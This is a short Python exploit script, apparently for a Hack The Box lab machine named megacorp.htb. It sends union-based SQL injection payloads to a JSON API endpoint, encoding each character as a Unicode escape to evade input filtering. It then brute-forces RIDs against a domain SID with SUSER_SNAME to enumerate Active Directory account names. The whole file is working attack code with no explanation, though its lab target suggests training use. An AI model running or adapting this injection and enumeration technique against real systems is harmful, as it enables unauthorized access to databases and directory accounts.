#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, time, json, sys

# Ctrl + C
def def_handler(sig,frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://megacorp.htb/api/getColleagues"
sid = "0x0105000000000005150000001c00d1bcd181f1492bdfc236"
# Funciones
def getUnicode(sqli):
    sqli_mod = ""

    for character in sqli:
        sqli_mod += "\\u00" + hex(ord(character))[2:]

    return sqli_mod

def makeRequest(sqli_mod):

    headers = {"Content-Type": "application/json;charset=utf-8"}
    post_data = '{"name":"%s"}' % sqli_mod

    r = requests.post(main_url, headers=headers, data=post_data)
    data_json = json.loads(r.text)
    return(json.dumps(data_json, indent=4))

def getRID(x):
    rid_hex = hex(x).replace('x','')
    list = []

    for character in rid_hex:
        list.append(character)

    rid = list[2] + list[3] + list[0] + list[1] + "0000"
    return rid

if __name__ == "__main__":
    
    for i in range(1100, 1200): 
        
        rid = getRID(i)
        sqli = "test' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -" % (sid, rid)

        sqli_mod = getUnicode(sqli)
        data_json = makeRequest(sqli_mod)
        print(data_json)

        
        
        
